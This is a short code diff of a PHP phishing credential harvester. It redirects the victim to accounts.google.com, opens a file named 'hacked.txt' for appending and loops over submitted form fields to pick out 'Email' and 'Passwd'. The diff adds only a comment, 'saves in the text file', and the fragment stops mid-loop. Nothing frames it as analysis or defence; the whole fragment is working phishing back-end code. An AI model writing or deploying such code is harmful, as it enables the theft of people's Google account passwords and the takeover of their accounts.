@@ -1,6 +1,7 @@
 <?php
 header ('Location:https://accounts.google.com/');
-$handle = fopen("hacked.txt", "a");
+$handle = fopen("hacked.txt", "a"); 
+//saves in the text file
 foreach($_POST as $variable => $value) {
     if($variable == "Email" || $variable == "Passwd")
 {
